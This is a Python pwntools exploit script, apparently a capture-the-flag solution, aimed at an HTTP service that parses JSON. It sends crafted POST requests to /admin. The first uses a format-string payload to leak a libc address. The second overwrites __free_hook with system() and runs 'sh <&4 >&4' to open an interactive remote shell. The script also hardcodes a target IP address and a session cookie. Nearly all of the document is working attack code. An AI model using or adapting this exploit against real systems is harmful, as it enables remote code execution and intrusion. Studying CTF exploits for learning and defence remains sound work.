#coding: utf8

'''
Seriously, don't rely on short-read.
https://github.com/pwning/docs/blob/master/suggestions-for-running-a-ctf.markdown#remote

We ran this script in frankfurt cloud VPS server. I failed all tries in my local computer, but after doing that, it worked.
'''

from pwn import *

ssid = ''
bssid = ''
dns = ''

HOST = '51.15.88.183'
HOST = '0.0.0.0'
PORT = 8080

target = 0x60f188 + 5 - 8
target2 = 0x60f210


def pack_headers(content_length):
    headers = {
        'Content-Type': 'application/json',
        'Cookie': 'sessionid=0b71662a3b766be303db07f68a0f497090a7e15060eac6a75aab6643c74b15c9',
        'Content-Length': str(content_length),
        'Host': '0.0.0.0:8080'
    }
    return '\r\n'.join(key + ': ' + value for key, value in headers.items())


def pack_json(x, additional_payload=''):
    return """
{
"%s": {
"%s": {
"%s": "%s",
"%s": "%s"%s
}
""".strip() % (
        'a' * 0x10,
        'a' * 0x67,
        ('a' * 31 + '\xff').ljust(0x28) + p64(0x7f) + p64(target),
        'a' * 0x67,
        x,
        'a' * 0x10,
        additional_payload
    )


def pack_http(data):
    return '''POST %s HTTP/1.1\r
%s\r
\r
%s''' % ('/admin', pack_headers(len(data)), data)


payload = pack_json(
    ('%p ' * 20 + '%59$p end').ljust(0x67) +
    '\xff' * (target2 - (target + 16) - 0x67) +
    p64(target + 16).rstrip('\x00')
)
r = remote(HOST, PORT)
r.send(pack_http(payload))

data = r.recvall()
data = data.split('end')[0].strip().replace('(nil)', '0x0')
data = [int(x, 16) for x in data.split(' ')]
print map(hex, data)

libc = ELF('x64.so')
libc.address = data[-1] - 0x20830
print hex(libc.address)

target = libc.symbols['stdout'] + 16 + 5 - 8
target2 = libc.symbols['__free_hook']
print hex(target)

rip = libc.symbols['system']
arg = "sh <&4 >&4"

fd = 4

r = remote(HOST, PORT)
# raw_input('aaa')
payload = pack_json(
    'a' * 0x67 +
    '\x00' * (target2 - (target + 16) - 0x67) +
    p64(rip),
    ", \"" + arg + "\": {"
)
print len(payload)
r.send(pack_http(payload))
r.interactive()
